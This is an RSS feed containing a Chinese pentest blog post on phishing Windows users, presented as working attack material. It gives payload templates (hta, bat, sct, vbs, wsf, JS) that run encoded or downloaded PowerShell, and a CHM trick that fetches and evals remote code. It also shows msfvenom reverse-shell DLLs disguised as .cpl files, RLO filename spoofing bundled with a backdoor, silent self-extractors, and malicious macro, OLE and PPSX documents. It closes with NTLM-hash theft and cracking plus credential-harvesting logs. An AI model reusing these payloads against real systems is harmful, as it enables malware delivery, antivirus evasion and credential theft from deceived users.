<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>*阔落阔西*</title>
    <description></description>
    <link>https://caijiji.github.io//blog/</link>
    <atom:link href="https://caijiji.github.io//blog/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 31 May 2019 00:22:52 +0800</pubDate>
    <lastBuildDate>Fri, 31 May 2019 00:22:52 +0800</lastBuildDate>
    <generator>Jekyll v3.0.1</generator>
    
      <item>
        <title>Windows钓鱼笔记</title>
        <description>&lt;h1 id=&quot;windows-basic-phishing&quot;&gt;Windows Basic Phishing&lt;/h1&gt;

&lt;p&gt;搬运老博客的文章作为新博客开篇。&lt;/p&gt;

&lt;p&gt;　Windows作为全球最广泛的操作系统,再攻击PC的时候钓鱼是一种最好的手段,在这里就简单的总结了一下最近看过跟之前使用过的一些方法。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;section&quot;&gt;文件名那些事&lt;/h2&gt;

&lt;h3 id=&quot;section-1&quot;&gt;翻转＋捆绑&lt;/h3&gt;

&lt;p&gt;　 Windows的文件名翻转其实是因为windows资源管理器在读取UNICODE字符时会倒序显示。&lt;/p&gt;

&lt;p&gt;所以当我们新建一个yougpj.scr的文件，然后在g前面插入Unicode字符RLO就可以将文件名 “变”　成yourcs.jpg。&lt;/p&gt;

&lt;p&gt;为了达成真正欺骗的目的.当然图标也需要改一下，在这里用ResHacker来实现图标修改。&lt;/p&gt;

&lt;p&gt;这样看起来就犹如一个jpg文件了:) 之后要做的就是捆绑一个真正的图片。用网上的捆绑器即可达成效果。&lt;/p&gt;

&lt;p&gt;但是捆绑在Windows Defence会直接识别成&lt;strong&gt;恶意文件&lt;/strong&gt;，这是需要注意的地方。&lt;/p&gt;

&lt;p&gt;效果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;&quot; alt=&quot;no pic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过点开恶意构造的钓鱼文件可以正常弹出图片而且后台运行了cmd.exe和sezhuo.exe自己捆绑的backdoor。&lt;/p&gt;

&lt;p&gt;　 可以看出来通过人的默认感知来识别的话基本感觉不出来差别。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;那些不怎么见过的后缀&lt;/h3&gt;

&lt;p&gt;由于钓鱼的目标一般都不是技术人员,所以用一些不怎么常见的后缀名是可以有效绕过杀软和电脑小白的眼睛的。&lt;/p&gt;

&lt;p&gt;这里先介绍Empire支持生成的一些payload&lt;/p&gt;

&lt;h4 id=&quot;empire&quot;&gt;Empire&lt;/h4&gt;

&lt;p&gt;Empire内部自带支持的有dll,hta,bat,sct,vbs等脚本&lt;/p&gt;

&lt;p&gt;在这里附上payload&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;hta&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;powershell -noP -sta -w 1 -enc  base64&#39;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;WScript.Shell&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bat&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@echo off
start /b powershell -noP -sta -w 1 -enc  base64
start /b &quot;&quot; cmd /c del &quot;%~f0&quot;&amp;amp;exit /b
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;sct&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?XML version=&quot;1.0&quot;?&amp;gt;
&amp;lt;scriptlet&amp;gt;
&amp;lt;registration
description=&quot;Win32COMDebug&quot;
progid=&quot;Win32COMDebug&quot;
version=&quot;1.00&quot;
classid=&quot;{AAAA1111-0000-0000-0000-0000FEEDACDC}&quot;
 &amp;gt;
 &amp;lt;script language=&quot;JScript&quot;&amp;gt;
      &amp;lt;![CDATA[
           var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&#39;powershell -noP -sta -w 1 -enc  base64&#39;);
      ]]&amp;gt;
 &amp;lt;/script&amp;gt;
&amp;lt;/registration&amp;gt;
&amp;lt;public&amp;gt;
    &amp;lt;method name=&quot;Exec&quot;&amp;gt;&amp;lt;/method&amp;gt;
&amp;lt;/public&amp;gt;
&amp;lt;/scriptlet&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;vbs/VBE&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dim objShell
Set objShell = WScript.CreateObject(&quot;WScript.Shell&quot;)
command = &quot;powershell -noP -sta -w 1 -enc  base64&quot;
objShell.Run command,0
Set objShell = Nothing
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section-3&quot;&gt;可执行文件后缀&lt;/h4&gt;

&lt;p&gt;Windows支持的可直接执行文件后缀有&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;exe pif com cmd scr (jar等需要安装三方软件包不在考虑中)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;shell&quot;&gt;那些双击就可弹shell的文件们&lt;/h4&gt;

&lt;h5 id=&quot;chm&quot;&gt;CHM&lt;/h5&gt;

&lt;p&gt;chm已经是很古老的一种玩法了，最初的都在用chm中挂马钓鱼,所以chm也是一种比较敏感的文件类型。&lt;/p&gt;

&lt;p&gt;随着ithurricanept发现chm可以直接执行任意代码起来，又有一轮新的利用chm钓鱼的apt攻击被人发现。&lt;/p&gt;

&lt;p&gt;这里使用evi1cg的方法来钓&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Refer:https://evi1cg.me/archives/chm_backdoor.html&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Mousejack replay&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
This is a demo ! &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;OBJECT&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;classid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Command&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ShortCut&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Bitmap::shortcut&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Item1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;,rundll32.exe,javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.1.9:8000/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}&#39;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Item2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;273,1,1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OBJECT&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;SCRIPT&amp;gt;&lt;/span&gt;
x.Click();
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SCRIPT&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;connect写入自己的hta代码即可　不使用JsRat也是可以的&lt;/p&gt;

&lt;p&gt;Example&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var c= &#39;powershell -noP -sta -w 1 -enc  base64&#39;
new ActiveXObject(&#39;WScript.Shell&#39;).Run(c);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;lnk&quot;&gt;Lnk&lt;/h5&gt;
&lt;p&gt;快捷方式也是经常利用来钓鱼的一种方法，比起nishang里面的payload，phrozen的参数隐藏payload让被攻击者会更容易相信，所以这里采用phrozen的payload&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;refer:https://www.phrozen.io/page/shortcuts-as-entry-points-for-malware-part-2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Shortcut_gen.exe test.txt sb.lnk
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在test.txt写入你的payload　也可以用phrozen的py将你的exe专成vbs的,但是发现payload越短越好，太大的话会超过lnk的最大大小，导致payload使用失败。&lt;br /&gt;
这里我使用的是powershell的payload&lt;br /&gt;
附上Shortcut_gen的下载地址&lt;/p&gt;

&lt;p&gt;https://raw.githubusercontent.com/CaiJiJi/Tools/master/Shortcut_gen.exe&lt;/p&gt;

&lt;h5 id=&quot;iqy&quot;&gt;IQY&lt;/h5&gt;

&lt;p&gt;iqy文件之前大家大部分都是只关注通过设置basic auth来获取账户密码或者NTLM Hash。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;refer:http://www.freebuf.com/news/76581.html&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;然而其实通过iqy文件是可以实现命令执行的&lt;/p&gt;

&lt;p&gt;先通过nishang生成目标文件&lt;/p&gt;

&lt;p&gt;&lt;em&gt;** Out-WebQuery -URL “http://192.168.1.9:8000/xxoo.html” **&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;然后再xxoo.html里面写入你的payload 这里使用web_delivery&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=cmd|&#39;/c powershell iex(New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.1.9:9988/fFV54jXDi&#39;&#39;) &#39;!A0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;效果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;&quot; alt=&quot;no pic &quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;jsjse&quot;&gt;JS/JSE&lt;/h5&gt;
&lt;p&gt;一直都很火的js backdoor 原理比较简单　而且JS的可扩展性是极高的，可以实现多种混淆来绕过杀软。&lt;/p&gt;

&lt;p&gt;这里给一个简单的payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c = &quot;powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.9:9988/fFV54jXDi&#39;));&quot;;
r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(c,0,true)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;保存为payload.js打开即可&lt;/p&gt;

&lt;h5 id=&quot;cpl&quot;&gt;CPL&lt;/h5&gt;

&lt;p&gt;其实cpl文件就是dll文件&lt;/p&gt;

&lt;p&gt;只需要用msf生成一个dll的payload将名字改成xx.cpl　如果目标双击的话　即可成功getshell&lt;/p&gt;

&lt;p&gt;payload&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.9 lport=4444 -f dll -o /tmp/test.cpl  
&lt;/code&gt;&lt;/p&gt;

&lt;h5 id=&quot;wsh&quot;&gt;WSH&lt;/h5&gt;

&lt;p&gt;Windows Script HOST可以调用其他的脚本例如js vbs&lt;/p&gt;

&lt;p&gt;再这里通过wsh来调用vbs脚本也是可以达成隐藏运行的目的&lt;/p&gt;

&lt;p&gt;suchas shell.wsh&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ScriptFile]
Path=C:\Users\Hacker\AppData\Local\Temp\run.vbs
[Options]
Timeout=0
DisplayLogo=1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;双击运行之后就会自动调用run.vbs来执行&lt;/p&gt;

&lt;h5 id=&quot;wsf&quot;&gt;WSF&lt;/h5&gt;

&lt;p&gt;Windows Script File是WSh使用的文件类型，他可以调用Js Vbs等内置脚本语言，还可以调用perl ruby python等用户安装的语言&lt;/p&gt;

&lt;p&gt;他通过XMl语法来解析文件。&lt;/p&gt;

&lt;p&gt;这里看一个payload的例子&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;job&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Partially works&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;VBScript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;cp&quot;&gt;&amp;lt;![CDATA[
      Dim objShell
      Set objShell = WScript.CreateObject(&quot;WScript.Shell&quot;)
      command = &quot;powershell -noP -sta -w 1 -enc  base64&quot; objShell.Run command,0
      Set objShell = Nothing
     ]]&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/job&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;####&lt;/p&gt;

&lt;h2 id=&quot;winrar&quot;&gt;Winrar&lt;/h2&gt;

&lt;h3 id=&quot;x01-winrar-4x-&quot;&gt;0x01 Winrar 4.x 漏洞&lt;/h3&gt;

&lt;p&gt;通过Winrar解压成zip时，通过C32ASM修改文件后缀名是可以达成伪装效果。&lt;br /&gt;
  &lt;img src=&quot;http://7xicbb.com1.z0.glb.clouddn.com/go1.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x02-winrar-&quot;&gt;0x02 Winrar 自解压&lt;/h3&gt;
&lt;p&gt;　　&lt;br /&gt;
  将之前准备好的payload选择添加到压缩文件，钩上创建自解压文件，在&lt;/p&gt;

&lt;p&gt;高级-&amp;gt;高级自解压选项－&amp;gt;常规解压路径中填％temp%&lt;/p&gt;

&lt;p&gt;然后设置中解压后运行输入&lt;br /&gt;
  &lt;code class=&quot;highlighter-rouge&quot;&gt;
  %temp%\payload.vbs
 &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在模式中的安静模式选择全部隐藏　然后就可以生成一份静默的自解压文件&lt;br /&gt;
  &lt;img src=&quot;http://7xicbb.com1.z0.glb.clouddn.com/rar.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;office&quot;&gt;Office&lt;/h2&gt;

&lt;h3 id=&quot;office-&quot;&gt;Office 宏&lt;/h3&gt;

&lt;p&gt;office宏的设置必须选择office97-03格式或者docm即启用宏的word文档才能启用宏。&lt;/p&gt;

&lt;p&gt;新建一个支持宏的word文档，选择视图-&amp;gt;宏-&amp;gt;查看宏(&lt;strong&gt;记得选择宏的位置为本文档　然后再点击创建&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://7xicbb.com1.z0.glb.clouddn.com/go1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后将生成好的payload粘贴进去保存即可&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;这里使用Empire的payload  usestager windows/macro&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;打开word文档再允许宏运行即可执行payload&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://7xicbb.com1.z0.glb.clouddn.com/go2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
  Windows Defence会将文件上传到服务器，但是不会报毒
  360之类的杀软会显示是宏病毒
 &lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;office-ole&quot;&gt;Office OLE&lt;/h3&gt;

&lt;p&gt;说到Office的OLE必然就会想到CVE-2017-0199但是CVE不在这次的讨论中.&lt;/p&gt;

&lt;p&gt;OLE的好处就是在于你的payload的免杀的前提下是不会触发Windows Defence 的报告　但是360依然报宏病毒( ?)&lt;/p&gt;

&lt;p&gt;Office系列在选择插入－&amp;gt;对象-&amp;gt;由文件创建(选择你提前构造好的bat vbs …即可)&lt;/p&gt;

&lt;p&gt;接下来修改显示名称跟ico图标即可&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://x/ole.png&quot; alt=&quot;no pic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;效果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://x/go3.gif&quot; alt=&quot;no pic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;比较不足的地方就是可恨的Windows提示框！&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;ppsx&quot;&gt;PPSX的动作设置&lt;/h3&gt;

&lt;p&gt;新建一份ppt文件，在选择&lt;strong&gt;插入-&amp;gt;形状-&amp;gt;动作按钮&lt;/strong&gt;　&lt;/p&gt;

&lt;p&gt;选择单击鼠标或者鼠标移过都行，再运行程序中填写&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c $q=new-object net.webclient;$q.proxy=[Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $q.downloadstring(&#39;http://192.168.1.9:9966/mSJ0xW1&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后保存文件 打开的时候会有一个安全提醒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://7xicbb.com1.z0.glb.clouddn.com/ppsx.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击全部启用就可以reverse shell了&lt;/p&gt;

&lt;h3 id=&quot;wordsteal&quot;&gt;WordSteal&lt;/h3&gt;

&lt;p&gt;wordsteal是可以通过插入一张带有UNC路径的图片在Word中来偷取目标的NTLM HASH。可以在不知不觉达到获取目标电脑密码的方法&lt;/p&gt;

&lt;p&gt;From:&lt;br /&gt;
&amp;gt; https://github.com/0x09AL/WordSteal&lt;/p&gt;

&lt;p&gt;使用方法:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ /home/Fuckyou/Pentest/fish/WordSteal git:(master) ✗ &amp;gt;python main.py 192.168.0.104 meinv.jpg 1
[+] Generated malicious file: 1505267824.rtf [+]
[+] Script Generated Successfully [+]
[+] Running Metasploit Auxiliary Module [+]
[*] Processing metasploit.rc for ERB directives.
resource (metasploit.rc)&amp;gt; use auxiliary/server/capture/smb
resource (metasploit.rc)&amp;gt; set SRVHOST 192.168.0.104
SRVHOST =&amp;gt; 192.168.0.104
resource (metasploit.rc)&amp;gt; set JOHNPWFILE passwords
JOHNPWFILE =&amp;gt; passwords
resource (metasploit.rc)&amp;gt; run
[*] Auxiliary module running as background job 0.

[*] Server started.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后目标打开word本地的smb server就可以收到NTLMHASH&lt;/p&gt;

&lt;p&gt;然后本地目录下会生成一个passwords_netntlmv2文件&lt;br /&gt;
之后直接用hashcat跑就行了&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat -m 5600 passwords_netntlmv2 wordlist.txt


HASEE::DESKTOP-24RANRN:1122334455667788:ad31355f7e0f3b9bd998509269e64343:0101000000000000524e074fea2bd301f00e42d2a6fda28200000000020000000000000000000000:ceshixxx
HASEE::DESKTOP-24RANRN:1122334455667788:35d523efdd13f9341a0caad899bb385d:0101000000000000aa405e4fea2bd301101636dd17f88daf00000000020000000000000000000000:ceshixxx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: xxoo.txt
Time.Started.....: Wed Sep 13 09:35:03 2017 (0 secs)
Time.Estimated...: Wed Sep 13 09:35:03 2017 (0 secs)
Guess.Base.......: File (word.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:        0 H/s (1.50ms)
Recovered........: 30/30 (100.00%) Digests, 30/30 (100.00%) Salts
Progress.........: 90/90 (100.00%)
Rejected.........: 0/90 (0.00%)
Restore.Point....: 0/3 (0.00%)
Candidates.#1....: ceshixxx -&amp;gt; 
HWMon.Dev.#1.....: N/A

Started: Wed Sep 13 09:34:55 2017
Stopped: Wed Sep 13 09:35:04 2017

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;phishery&quot;&gt;phishery&lt;/h3&gt;

&lt;p&gt;phishery跟Wordsteal都是通过Word模板注入来进行HTTP Basic认证钓鱼&lt;/p&gt;

&lt;p&gt;From:&lt;br /&gt;
&amp;gt; https://github.com/0x09AL/WordSteal&lt;/p&gt;

&lt;p&gt;使用方法&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ /home/Fuckyou/Pentest/fish/phishery1.0.2linux-amd64 &amp;gt;./phishery -u https://192.168.0.104/docs -i gogogo.docx -o bad.docx
[+] Opening Word document: gogogo.docx
[+] Setting Word document template to: https://192.168.0.104/docs
[+] Saving injected Word document to: bad.docx
[*] Injected Word document has been saved!
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;建议注册一个域名并签个证书　这样可以很大的提升诱惑度。&lt;br /&gt;
证书的话当然就是推荐Letsencrypt了&lt;br /&gt;
效果如图所示&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://7xicbb.com1.z0.glb.clouddn.com/phishing.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Server那边就会收到被钓人的信息&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] New credentials harvested!
[HTTP] Host       : 192.168.0.104
[HTTP] Request    : OPTIONS /
[HTTP] User Agent : Microsoft Office Word 2013
[HTTP] IP Address : 192.168.0.104
[AUTH] Username   : Administrator
[AUTH] Password   : ceshi
[*] Request Received at 2017-09-13 10:18:43: HEAD https://192.168.0.104/docs
[*] New credentials harvested!
[HTTP] Host       : 192.168.0.104
[HTTP] Request    : HEAD /docs
[HTTP] User Agent : Microsoft Office Word 2013
[HTTP] IP Address : 192.168.0.104
[AUTH] Username   : Administrator
[AUTH] Password   : ceshi
[*] Request Received at 2017-09-13 10:18:43: OPTIONS https://192.168.0.104/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ruler&quot;&gt;ruler&lt;/h3&gt;

&lt;p&gt;ruler是一款专门针对Exchange的攻击工具&lt;/p&gt;

&lt;p&gt;From:&lt;br /&gt;
&amp;gt; https://github.com/sensepost/ruler&lt;/p&gt;

&lt;p&gt;ruler的功能挺强大的　如果对他感兴趣的话可以参照官方wiki来详细使用一下。&lt;br /&gt;
Example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ /home/Fuckyou/Pentest/fish/ruler git:(master) ✗ &amp;gt;./ruler-linux64 --email ****@***.com form add --suffix nihao --body hello --subject test --input /tmp/launcher.vbs --send
Password: 
[+] Found cached Autodiscover record. Using this (use --nocache to force new lookup)
[+] Create Form Pointer Attachment
[+] Create Form Template Attachment
[+] Sending email.
[+] Email sent! Hopefully you will have a shell soon.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;当目标点开我们的邮件时&lt;br /&gt;
我们Empire就收到shell了&lt;/p&gt;
</description>
        <pubDate>Wed, 20 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://caijiji.github.io//blog/pentest/2017/09/20/Windows-Basic-Phishing.html</link>
        <guid isPermaLink="true">https://caijiji.github.io//blog/pentest/2017/09/20/Windows-Basic-Phishing.html</guid>
        
        <category>phishing</category>
        
        
        <category>Pentest</category>
        
